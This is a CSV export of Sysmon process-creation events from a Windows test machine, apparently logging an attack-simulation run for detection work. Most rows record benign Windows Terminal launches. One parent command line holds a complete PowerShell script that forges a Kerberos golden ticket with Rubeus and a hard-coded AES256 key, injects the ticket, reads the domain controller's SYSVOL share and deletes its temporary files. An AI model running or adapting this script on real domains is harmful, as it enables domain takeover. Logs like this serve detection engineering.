Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9481,,-,"MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.916

ProcessGuid: {fda94052-43ad-658d-7e02-000000000b00}

ProcessId: 10352

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,{fda94052-43ad-658d-7e02-000000000b00},7044,10352,-,,,,,"
      ",-,,,,,,2023-12-28T09:45:17.9171280Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:17.916,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:17.9171280Z""/>
      <EventRecordID>9481</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:17.916</Data>
      <Data Name=""ProcessGuid"">{fda94052-43ad-658d-7e02-000000000b00}</Data>
      <Data Name=""ProcessId"">10352</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.916

ProcessGuid: {fda94052-43ad-658d-7e02-000000000b00}

ProcessId: 10352

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9480,,-,"MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.863

ProcessGuid: {fda94052-43ad-658d-7d02-000000000b00}

ProcessId: 8460

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,{fda94052-43ad-658d-7d02-000000000b00},7044,8460,-,,,,,"
      ",-,,,,,,2023-12-28T09:45:17.8644448Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:17.863,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:17.8644448Z""/>
      <EventRecordID>9480</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:17.863</Data>
      <Data Name=""ProcessGuid"">{fda94052-43ad-658d-7d02-000000000b00}</Data>
      <Data Name=""ProcessId"">8460</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.863

ProcessGuid: {fda94052-43ad-658d-7d02-000000000b00}

ProcessId: 8460

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Command Processor,,,,,,,1,9479,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-43ad-658d-6a72-ce0000000000},0xce726a,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.835

ProcessGuid: {fda94052-43ad-658d-7b02-000000000b00}

ProcessId: 5280

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43ad-658d-6a72-ce0000000000}

LogonId: 0xCE726A

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-43ad-658d-7a02-000000000b00}

ParentProcessId: 9804

ParentImage: C:\Windows\System32\runas.exe

ParentCommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat",C:\Windows\System32\runas.exe,{fda94052-43ad-658d-7a02-000000000b00},9804,WINDEV2309EVAL\User,{fda94052-43ad-658d-7b02-000000000b00},7044,5280,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:17.8364932Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:17.835,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:17.8364932Z""/>
      <EventRecordID>9479</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:17.835</Data>
      <Data Name=""ProcessGuid"">{fda94052-43ad-658d-7b02-000000000b00}</Data>
      <Data Name=""ProcessId"">5280</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-43ad-658d-6a72-ce0000000000}</Data>
      <Data Name=""LogonId"">0xce726a</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43ad-658d-7a02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">9804</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\runas.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.835

ProcessGuid: {fda94052-43ad-658d-7b02-000000000b00}

ProcessId: 5280

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43ad-658d-6a72-ce0000000000}

LogonId: 0xCE726A

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-43ad-658d-7a02-000000000b00}

ParentProcessId: 9804

ParentImage: C:\Windows\System32\runas.exe

ParentCommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Run As Utility,,,,,,,1,9478,,10.0.22621.1 (WinBuild.160101.0800),"MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58",C:\Windows\System32\runas.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.775

ProcessGuid: {fda94052-43ad-658d-7a02-000000000b00}

ProcessId: 9804

Image: C:\Windows\System32\runas.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Run As Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: RUNAS.EXE

CommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58

ParentProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ParentProcessId: 3524

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}

ParentUser: WINDEV2309EVAL\User",Info,RUNAS.EXE,"""powershell.exe"" & {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-43ac-658d-7702-000000000b00},3524,WINDEV2309EVAL\User,{fda94052-43ad-658d-7a02-000000000b00},7044,9804,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:17.7768029Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:17.775,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:17.7768029Z""/>
      <EventRecordID>9478</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:17.775</Data>
      <Data Name=""ProcessGuid"">{fda94052-43ad-658d-7a02-000000000b00}</Data>
      <Data Name=""ProcessId"">9804</Data>
      <Data Name=""Image"">C:\Windows\System32\runas.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Run As Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">RUNAS.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43ac-658d-7702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">3524</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c \""""$Env:temp\rubeus.exe\"""" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""") /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(\""""golden_\"""")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%TEMP%\golden.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  \""""$Env:temp\rubeus.exe\"""" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$($ENV:logonserver.TrimStart('\') + \"""".\"""" + \""""$ENV:userdnsdomain\"""")\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""kirbifile\"""", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:17.775

ProcessGuid: {fda94052-43ad-658d-7a02-000000000b00}

ProcessId: 9804

Image: C:\Windows\System32\runas.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Run As Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: RUNAS.EXE

CommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58

ParentProcessGuid: {fda94052-43ac-658d-7702-000000000b00}

ParentProcessId: 3524

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

